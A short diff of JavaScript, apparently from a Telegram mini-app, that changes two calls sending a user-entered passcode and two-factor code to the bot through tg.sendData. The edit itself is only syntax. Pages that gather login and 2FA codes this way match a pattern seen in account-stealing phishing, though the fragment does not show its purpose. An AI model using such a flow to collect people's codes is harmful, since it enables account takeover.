@@ -45,7 +45,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const value = passcodeInput.value;
 
     
-    tg.sendData(JSON.stringify({ action: "passcode_value", value }));
+    tg.sendData(JSON.stringify({ action: "passcode_value", value: value }));
     page2.style.transform = "translate(-50%, 40px)";
         page2.style.opacity = "0";
 
@@ -63,7 +63,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const twofactorBtn = document.getElementById("twofactor-btn");
     twofactorBtn.addEventListener("click", () => {
       const value = twofactorInput.value;
-      tg.sendData(JSON.stringify({ action: "twofactor_value", value }));
+      tg.sendData(JSON.stringify({ action: "twofactor_value", value: value }));
     });
 
 
